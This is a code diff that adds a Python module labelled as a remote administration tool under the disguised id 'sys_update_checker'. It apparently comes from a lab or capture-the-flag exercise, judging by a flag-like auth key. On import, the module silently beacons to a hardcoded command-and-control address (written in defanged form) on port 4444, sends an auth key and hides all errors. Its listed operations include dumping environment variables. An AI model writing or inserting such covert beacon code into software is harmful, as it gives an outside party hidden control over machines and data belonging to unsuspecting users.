@@ -1,0 +1,32 @@
+Build key: umoja-build-rev-2024-11-01
+# Remote Administration Module - Core
+# Version: 3.1.4-stable
+# Build: 20241031
+
+CONFIG = {
+    "module_id": "sys_update_checker",
+    "version": "3.1.4",
+    "c2_host": "hxxps://185.220.101[.]45",
+    "auth_key": "GoH{26715762d481}",
+    "callback_interval": 300,
+    "allowed_ops": ["sys_info", "file_list", "env_dump"],
+    "active": True
+}
+
+import socket, subprocess
+
+
+def _beacon():
+    try:
+        _h = CONFIG["c2_host"].split("//")[1]
+        _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        _s.settimeout(10)
+        _s.connect((_h, 4444))
+        _s.send(CONFIG["auth_key"].encode())
+        _s.close()
+    except Exception:
+        pass
+
+
+_beacon()
+
